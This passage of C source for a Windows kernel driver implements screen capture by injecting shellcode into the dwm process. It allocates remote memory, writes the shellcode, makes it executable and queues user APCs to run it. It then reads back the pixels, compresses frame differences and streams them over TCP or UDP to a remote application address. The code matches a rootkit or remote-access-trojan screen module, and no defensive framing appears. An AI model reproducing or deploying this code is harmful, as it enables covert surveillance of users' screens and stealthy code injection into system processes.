            return STATUS_INSUFFICIENT_RESOURCES;
        }
        compSize = RleCompressDwords((const ULONG*)diffBuf, dwordCnt,
                                     compBuf, compCapacity);
    }
    ExFreePoolWithTag(diffBuf, TAG_SS);

    /* If RLE made it bigger, fall back to keyframe raw binary */
    if (compSize == 0 || compSize > PxLen) {
        ExFreePoolWithTag(compBuf, TAG_SS);
        compBuf = (PUCHAR)ExAllocatePool2(POOL_FLAG_PAGED, PxLen, TAG_SS);
        if (!compBuf) return STATUS_INSUFFICIENT_RESOURCES;
        RtlCopyMemory(compBuf, Px, PxLen);
        compSize = PxLen;
        isKey = TRUE;  /* force keyframe — no RLE header */
    }

    /* Save current frame as prev */
    if (!g_PrevFrame || g_PrevFrameSize < PxLen) {
        if (g_PrevFrame) ExFreePoolWithTag(g_PrevFrame, TAG_SS);
        g_PrevFrame = (PUCHAR)ExAllocatePool2(POOL_FLAG_PAGED, PxLen, TAG_SS);
        if (g_PrevFrame) g_PrevFrameSize = PxLen;
        else             g_PrevFrameSize = 0;
    }
    if (g_PrevFrame) RtlCopyMemory(g_PrevFrame, Px, PxLen);

    /* --- Send via TCP (preferred) or UDP (fallback) --- */
    if (TcpLinkIsScreenConnected() || TcpLinkIsConnected()) {
        /* TCP screen path: split compressed payload into bounded frames.
           A single huge TCP frame blocks the channel until it is fully sent;
           smaller frames keep screen latency predictable and leave room for
           control/file channels to progress independently. */

        chunkSz  = NETDRV_TCP_SCREEN_CHUNK_BYTES;
        chunkCnt = (compSize + chunkSz - 1) / chunkSz;
        if (chunkCnt == 0)
            chunkCnt = 1;

        /* B|shot2| header */
        RtlStringCbPrintfA(hdr, sizeof(hdr),
            "B|shot2|%u|%u|%u|%X|%X|%u|%u|%u\n",
            fid, W, H, PxLen, compSize, chunkSz, chunkCnt, isKey ? 1 : 0);
        TcpLinkSendScreenString(hdr);

        st = STATUS_SUCCESS;
        for (i = 0; i < chunkCnt; ++i) {
            ULONG offBytes = i * chunkSz;
            ULONG thisLen = compSize - offBytes;
            if (thisLen > chunkSz)
                thisLen = chunkSz;

            pkt = (UCHAR*)ExAllocatePool2(POOL_FLAG_PAGED,
                                           2 + 16 + thisLen, TAG_SS);
            if (!pkt) {
                st = STATUS_INSUFFICIENT_RESOURCES;
                break;
            }

            UCHAR* p = pkt;
            *p++ = 'Z'; *p++ = '|';
            *(ULONG*)p = fid;      p += 4;
            *(ULONG*)p = i;        p += 4;
            *(ULONG*)p = offBytes; p += 4;
            *(ULONG*)p = thisLen;  p += 4;
            RtlCopyMemory(p, compBuf + offBytes, thisLen);

            st = TcpLinkSendScreen(pkt, (ULONG)(2 + 16 + thisLen));
            ExFreePoolWithTag(pkt, TAG_SS);
            pkt = NULL;
            if (!NT_SUCCESS(st))
                break;
        }

        /* E|shot2| trailer */
        if (NT_SUCCESS(st)) {
            CHAR tr[96];
            RtlStringCbPrintfA(tr, sizeof(tr),
                "E|shot2|%u|%X\n", fid, compSize);
            TcpLinkSendScreenString(tr);
        }
    } else {
        /* UDP fallback path (legacy) */
        st = WSK_socket(&sock, AF_INET, SOCK_DGRAM, IPPROTO_UDP,
                         WSK_FLAG_DATAGRAM_SOCKET);
        if (!NT_SUCCESS(st)) { ExFreePoolWithTag(compBuf, TAG_SS); return st; }

        RtlZeroMemory(&local, sizeof(local));
        local.sin_family                   = AF_INET;
        local.sin_addr.S_un.S_un_b.s_b1   = NETDRV_DRIVER_IP_B1;
        local.sin_addr.S_un.S_un_b.s_b2   = NETDRV_DRIVER_IP_B2;
        local.sin_addr.S_un.S_un_b.s_b3   = NETDRV_DRIVER_IP_B3;
        local.sin_addr.S_un.S_un_b.s_b4   = NETDRV_DRIVER_IP_B4;
        st = WSKBind(sock, (PSOCKADDR)&local);
        if (!NT_SUCCESS(st)) {
            WSK_closesocket(sock);
            ExFreePoolWithTag(compBuf, TAG_SS);
            return st;
        }

        RtlZeroMemory(&peer, sizeof(peer));
        peer.sin_family                  = AF_INET;
        peer.sin_port                    = RtlUshortByteSwap(NETDRV_UDP_PORT);
        peer.sin_addr.S_un.S_un_b.s_b1  = NETDRV_APP_IP_B1;
        peer.sin_addr.S_un.S_un_b.s_b2  = NETDRV_APP_IP_B2;
        peer.sin_addr.S_un.S_un_b.s_b3  = NETDRV_APP_IP_B3;
        peer.sin_addr.S_un.S_un_b.s_b4  = NETDRV_APP_IP_B4;

        chunkSz  = 8192;
        chunkCnt = (compSize + chunkSz - 1) / chunkSz;

        /* B|shot2| header (text) */
        RtlStringCbPrintfA(hdr, sizeof(hdr),
            NETDRV_UDP_PACKET_MAGIC "B|shot2|%u|%u|%u|%X|%X|%u|%u|%u\n",
            fid, W, H, PxLen, compSize, chunkSz, chunkCnt, isKey ? 1 : 0);
        WSKSendTo(sock, hdr, strlen(hdr), &sent, (PSOCKADDR)&peer);

        /* Z| binary chunks */
#define Z_HDR_SIZE  (NETDRV_UDP_PACKET_MAGIC_LEN + 2 + 16)
        pkt = (UCHAR*)ExAllocatePool2(POOL_FLAG_NON_PAGED,
                                       Z_HDR_SIZE + chunkSz, TAG_SS);
        if (pkt) {
            LARGE_INTEGER throttleDly;
            throttleDly.QuadPart = -10000;  /* 1 ms */
            for (i = 0; i < chunkCnt; i++) {
                ULONG off = i * chunkSz;
                ULONG len = (compSize - off > chunkSz) ? chunkSz : (compSize - off);
                UCHAR* p  = pkt;

                RtlCopyMemory(p, NETDRV_UDP_PACKET_MAGIC, NETDRV_UDP_PACKET_MAGIC_LEN);
                p += NETDRV_UDP_PACKET_MAGIC_LEN;
                *p++ = 'Z'; *p++ = '|';
                *(ULONG*)p = fid;  p += 4;
                *(ULONG*)p = i;    p += 4;
                *(ULONG*)p = off;  p += 4;
                *(ULONG*)p = len;  p += 4;
                RtlCopyMemory(p, compBuf + off, len);

                WSKSendTo(sock, pkt, (SIZE_T)(Z_HDR_SIZE + len),
                          &sent, (PSOCKADDR)&peer);

                if (InterlockedCompareExchange(&g_ControlStop, 0, 0) != 0)
                    break;

                if (chunkCnt > 4 && (i & 31) == 31)
                    KeDelayExecutionThread(KernelMode, FALSE, &throttleDly);
            }
            ExFreePoolWithTag(pkt, TAG_SS);
        }
#undef Z_HDR_SIZE

        /* E|shot2| trailer */
        {
            CHAR tr[96];
            RtlStringCbPrintfA(tr, sizeof(tr),
                NETDRV_UDP_PACKET_MAGIC "E|shot2|%u|%X\n", fid, compSize);
            WSKSendTo(sock, tr, strlen(tr), &sent, (PSOCKADDR)&peer);
        }

        WSK_closesocket(sock);
    }

    ExFreePoolWithTag(compBuf, TAG_SS);
    if ((fid & 63) == 1)
        LOG("SendFrame: #%u %ux%u raw=%u comp=%u key=%d chunks=%u",
            fid, W, H, PxLen, compSize, isKey, chunkCnt);
    return STATUS_SUCCESS;
}

/* ===================================================================
   (7)  Persistent state + orchestrator
   =================================================================== */

static PEPROCESS g_Dwm           = NULL;
static SC_PARAMS g_LocalP;                    /* resolved API addresses  */
static PVOID     g_RemoteParams  = NULL;      /* dwm-side params+pixels  */
static PVOID     g_RemoteCode    = NULL;      /* dwm-side shellcode page */
static HANDLE    g_CachedTid     = NULL;
static HANDLE    g_AllTids[DWM_MAX_THREADS];
static ULONG     g_AllTidCount   = 0;
static PVOID     g_PixelBuf      = NULL;      /* kernel-side frame buffer */
static ULONG     g_PixelBufSize  = 0;
static ULONG     g_FrameCount    = 0;
static BOOLEAN   g_Inited        = FALSE;

static NTSTATUS
ScreenEnsureInit(VOID)
{
    NTSTATUS st;

    if (g_Inited) return STATUS_SUCCESS;

    LOG("ScreenInit: one-time setup");

    RtlZeroMemory(g_AllTids, sizeof(g_AllTids));
    st = FindTargetProcess(&g_Dwm, g_AllTids, &g_AllTidCount);
    if (!NT_SUCCESS(st)) { LOG("ScreenInit: target process not found 0x%08X", st); return st; }
    LOG("ScreenInit: dwm pid=%u threads=%u",
        (ULONG)(ULONG_PTR)PsGetProcessId(g_Dwm), g_AllTidCount);

    RtlZeroMemory(&g_LocalP, sizeof(g_LocalP));
    st = ResolveApis(g_Dwm, &g_LocalP);
    if (!NT_SUCCESS(st)) { LOG("ScreenInit: API resolve 0x%08X", st); goto Fail; }

    st = AllocRemote(g_Dwm, SC_ALLOC_SIZE, PAGE_READWRITE, &g_RemoteParams);
    if (!NT_SUCCESS(st)) { LOG("ScreenInit: alloc params 0x%08X", st); goto Fail; }

    st = AllocRemote(g_Dwm, PAGE_SIZE, PAGE_READWRITE, &g_RemoteCode);
    if (!NT_SUCCESS(st)) { LOG("ScreenInit: alloc code 0x%08X", st); goto Fail; }

    st = WriteRemote(g_Dwm, g_RemoteCode, g_ShellcodeGdi, g_ShellcodeGdiSize);
    if (!NT_SUCCESS(st)) { LOG("ScreenInit: write code 0x%08X", st); goto Fail; }

    {
        KAPC_STATE as;
        PVOID  base = g_RemoteCode;
        SIZE_T sz   = PAGE_SIZE;
        ULONG  oldP;
        KeStackAttachProcess(g_Dwm, &as);
        st = ZwProtectVirtualMemory(ZwCurrentProcess(), &base, &sz,
                                     PAGE_EXECUTE_READ, &oldP);
        KeUnstackDetachProcess(&as);
        if (!NT_SUCCESS(st)) { LOG("ScreenInit: protect RX 0x%08X", st); goto Fail; }
    }

    /* Write initial params (API pointers) */
    g_LocalP.Ready  = 0;
    g_LocalP.Status = -1;
    st = WriteRemote(g_Dwm, g_RemoteParams, &g_LocalP, sizeof(g_LocalP));
    if (!NT_SUCCESS(st)) { LOG("ScreenInit: write params 0x%08X", st); goto Fail; }

    g_Inited = TRUE;
    LOG("ScreenInit: done, remote params=%p code=%p", g_RemoteParams, g_RemoteCode);
    return STATUS_SUCCESS;

Fail:
    NetDrvScreenCleanup();
    return st;
}

VOID
NetDrvScreenCleanup(VOID)
{
    ScreenCancelPendingApcs();
    if (g_PrevFrame)    { ExFreePoolWithTag(g_PrevFrame, TAG_SS); g_PrevFrame = NULL; g_PrevFrameSize = 0; }
    if (g_PixelBuf)     { ExFreePoolWithTag(g_PixelBuf, TAG_SS); g_PixelBuf = NULL; }
    if (g_RemoteCode)   { if (g_Dwm) FreeRemote(g_Dwm, g_RemoteCode);   g_RemoteCode = NULL; }
    if (g_RemoteParams) { if (g_Dwm) FreeRemote(g_Dwm, g_RemoteParams); g_RemoteParams = NULL; }
    if (g_Dwm)          { ObDereferenceObject(g_Dwm); g_Dwm = NULL; }
    g_Inited = FALSE;
    g_CachedTid = NULL;
    g_AllTidCount = 0;
    g_PixelBufSize = 0;
}

NTSTATUS
NetDrvScreenCapture(VOID)
{
    NTSTATUS st;
    LONG     ready = 0;

    PAGED_CODE();

    /* Prevent concurrent captures — races on g_PixelBuf/g_PrevFrame
       cause double-free → BAD_POOL_HEADER (0x19). */
    if (InterlockedCompareExchange(&g_ShotBusy, 1, 0) != 0)
        return STATUS_DEVICE_BUSY;

    /* ---- lazy init ---- */
    st = ScreenEnsureInit();
    if (!NT_SUCCESS(st)) { InterlockedExchange(&g_ShotBusy, 0); return st; }

    /* Force keyframe every 30 frames OR on app request.
       TCP is reliable so we rarely need keyframes; diff frames
       are tiny and transmit instantly. */
    if (g_PrevFrame &&
        ((g_FrameCount % 30) == 0 ||
         InterlockedCompareExchange(&g_ForceKeyframe, 0, 1) == 1)) {
        ExFreePoolWithTag(g_PrevFrame, TAG_SS);
        g_PrevFrame = NULL;
        g_PrevFrameSize = 0;
    }

    /* ---- reset Ready flag (just 8 bytes, not the whole 32MB params) ---- */
    {
        LONG zero = 0;
        LONG neg1 = -1;
        WriteRemote(g_Dwm,
            (PUCHAR)g_RemoteParams + FIELD_OFFSET(SC_PARAMS, Ready),
            &zero, sizeof(zero));
        WriteRemote(g_Dwm,
            (PUCHAR)g_RemoteParams + FIELD_OFFSET(SC_PARAMS, Status),
            &neg1, sizeof(neg1));
    }

    /* ---- queue APC (cached thread first, fallback scan) ---- */
    {
        LARGE_INTEGER dly;
        dly.QuadPart = -10000;   /* 1 ms */

        if (g_CachedTid) {
            st = QueueUserApc(g_CachedTid, g_RemoteCode, g_RemoteParams);
            if (NT_SUCCESS(st)) {
                ULONG poll;
                for (poll = 0; poll < 200; poll++) {
                    ReadRemote(g_Dwm,
                        (PUCHAR)g_RemoteParams + FIELD_OFFSET(SC_PARAMS, Ready),
                        &ready, sizeof(ready));
                    if (ready) break;
                    if (InterlockedCompareExchange(&g_ControlStop, 0, 0) != 0)
                        break;
                    KeDelayExecutionThread(KernelMode, FALSE, &dly);
                }
            }
            if (!ready) g_CachedTid = NULL;
        }

        if (!ready) {
            ULONG ti;
            for (ti = 0; ti < g_AllTidCount && !ready; ti++) {
                LONG zero = 0;
                WriteRemote(g_Dwm,
                    (PUCHAR)g_RemoteParams + FIELD_OFFSET(SC_PARAMS, Ready),
                    &zero, sizeof(zero));
                st = QueueUserApc(g_AllTids[ti], g_RemoteCode, g_RemoteParams);
                if (!NT_SUCCESS(st)) continue;
                {
                    ULONG poll;
                    for (poll = 0; poll < 100; poll++) {
                        ReadRemote(g_Dwm,
                            (PUCHAR)g_RemoteParams + FIELD_OFFSET(SC_PARAMS, Ready),
                            &ready, sizeof(ready));
                        if (ready) break;
                        if (InterlockedCompareExchange(&g_ControlStop, 0, 0) != 0)
                            break;
                        KeDelayExecutionThread(KernelMode, FALSE, &dly);
                    }
                }
                if (ready) {
                    g_CachedTid = g_AllTids[ti];
                    LOG("APC: cached tid=%u", (ULONG)(ULONG_PTR)g_AllTids[ti]);
                }
            }
        }

        if (!ready) {
            if ((g_FrameCount & 15) == 0)
                LOG("ScreenCapture: APC timeout (frame %u)", g_FrameCount);
            g_FrameCount++;
            InterlockedExchange(&g_ShotBusy, 0);
            return STATUS_TIMEOUT;
        }
    }

    /* ---- read result + send ---- */
    {
        SC_PARAMS hdr;
        ULONG w, h, frameSize;

        RtlZeroMemory(&hdr, sizeof(hdr));
        st = ReadRemote(g_Dwm, g_RemoteParams, &hdr, sizeof(hdr));
        if (!NT_SUCCESS(st)) {
            /* dwm state may be stale (e.g. resolution change, dwm restart) */
            NetDrvScreenCleanup();
            g_FrameCount++;
            InterlockedExchange(&g_ShotBusy, 0);
            return st;
        }
        if (hdr.Status != 0) { g_FrameCount++; InterlockedExchange(&g_ShotBusy, 0); return STATUS_UNSUCCESSFUL; }

        w = hdr.Width; h = hdr.Height; frameSize = hdr.FrameSize;
        if (frameSize == 0 || frameSize > SC_MAX_FRAME) {
            g_FrameCount++;
            InterlockedExchange(&g_ShotBusy, 0);
            return STATUS_INVALID_BUFFER_SIZE;
        }

        /* Reuse pixel buffer if same size */
        if (g_PixelBufSize < frameSize) {
            if (g_PixelBuf) ExFreePoolWithTag(g_PixelBuf, TAG_SS);
            g_PixelBuf = ExAllocatePool2(POOL_FLAG_PAGED, frameSize, TAG_SS);
            if (!g_PixelBuf) { g_PixelBufSize = 0; g_FrameCount++; InterlockedExchange(&g_ShotBusy, 0); return STATUS_INSUFFICIENT_RESOURCES; }
            g_PixelBufSize = frameSize;
        }

        st = ReadRemote(g_Dwm,
                (PUCHAR)g_RemoteParams + SC_PIXEL_OFFSET,
                g_PixelBuf, frameSize);
        if (!NT_SUCCESS(st)) {
            NetDrvScreenCleanup();
            g_FrameCount++;
            InterlockedExchange(&g_ShotBusy, 0);
            return st;
        }

        /* DEBUG: check if capture is all-black; if so, paint a test pattern
         * so we can tell whether V2 pipeline works vs capture is broken. */
        {
            ULONG* px32 = (ULONG*)g_PixelBuf;
            ULONG  nPix = frameSize / 4;
            BOOLEAN allBlack = TRUE;
            ULONG   k;
            for (k = 0; k < nPix && k < 1024; k++) {
                if (px32[k] != 0) { allBlack = FALSE; break; }
            }
            if (allBlack && nPix > 0) {
                /* Paint gradient test pattern: rows cycle R/G/B */
                for (k = 0; k < nPix; k++) {
                    ULONG row = k / w;
                    ULONG col = k % w;
                    UCHAR r = (UCHAR)((col * 255) / (w > 1 ? w - 1 : 1));
                    UCHAR g = (UCHAR)((row * 255) / (h > 1 ? h - 1 : 1));
                    UCHAR b = 128;
                    px32[k] = (ULONG)b | ((ULONG)g << 8) | ((ULONG)r << 16) | 0xFF000000u;
                }
            }
        }

        /*
         * Downscale to max width. TCP can handle larger frames reliably;
         * 1920px keeps 1080p desktops native while still limiting 4K
         * keyframes to roughly 8 MB.
         */
#define SS_MAX_SEND_WIDTH  1920
        if (w > SS_MAX_SEND_WIDTH) {
            ULONG newW = SS_MAX_SEND_WIDTH;
            ULONG newH = (ULONG)((ULONG64)h * newW / w);
            if (newH == 0) newH = 1;
            ULONG newSize = newW * newH * 4;
            PUCHAR dst = (PUCHAR)ExAllocatePool2(POOL_FLAG_PAGED, newSize, TAG_SS);
            if (dst) {
                const ULONG* src32 = (const ULONG*)g_PixelBuf;
                ULONG* dst32 = (ULONG*)dst;
                ULONG y, x;
                for (y = 0; y < newH; y++) {
                    ULONG srcY = (ULONG)((ULONG64)y * h / newH);
                    const ULONG* srcRow = src32 + srcY * w;
                    for (x = 0; x < newW; x++) {
                        ULONG srcX = (ULONG)((ULONG64)x * w / newW);
                        dst32[y * newW + x] = srcRow[srcX];
                    }
                }
                /* Swap buffer */
                if (g_PixelBufSize < newSize) {
                    ExFreePoolWithTag(g_PixelBuf, TAG_SS);
                    g_PixelBuf = dst;
                    g_PixelBufSize = newSize;
                } else {
                    RtlCopyMemory(g_PixelBuf, dst, newSize);
                    ExFreePoolWithTag(dst, TAG_SS);
                }
                w = newW;
                h = newH;
                frameSize = newSize;
            }
        }
#undef SS_MAX_SEND_WIDTH

        st = SendFrame(w, h, (PUCHAR)g_PixelBuf, frameSize);
    }

    g_FrameCount++;
    InterlockedExchange(&g_ShotBusy, 0);
    return st;
}
